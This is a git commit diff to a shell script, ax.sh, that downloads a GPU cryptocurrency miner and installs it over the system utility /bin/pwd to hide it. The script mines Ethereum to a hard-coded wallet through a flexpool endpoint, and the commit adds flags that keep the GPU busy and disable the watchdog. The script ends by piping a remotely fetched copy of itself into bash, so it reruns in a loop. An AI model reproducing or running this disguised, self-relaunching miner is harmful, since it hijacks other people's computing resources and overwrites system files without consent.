eb6bdcbf1474dc7ed712b806d43db9d3fb1cab44
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-11 14:11:42 +0700

    Update ax.sh

--- ax.sh
+++ ax.sh
@@ -5,8 +5,6 @@ curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
 mv t-rex /bin/pwd
 chmod +x /bin/pwd
 
-/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240
-
-sleep 2m
+/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
 
 curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/ax.sh | bash
